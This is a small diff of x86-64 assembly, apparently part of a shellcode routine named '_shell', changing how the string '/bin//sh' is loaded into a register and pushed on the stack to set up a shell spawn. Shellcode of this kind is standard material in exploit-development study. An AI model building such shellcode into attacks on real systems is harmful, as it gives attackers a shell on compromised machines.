@@ -173,7 +173,8 @@ _shell:
         push rax
 
         ; push /bin//sh in reverse
-        mov rbx, 0x68732f2f6e69622f
+        ;mov rbx, 0x68732f2f6e69622f
+	mov rbx, '/bin//sh'
         push rbx
 
         ; store /bin//sh address in RDI
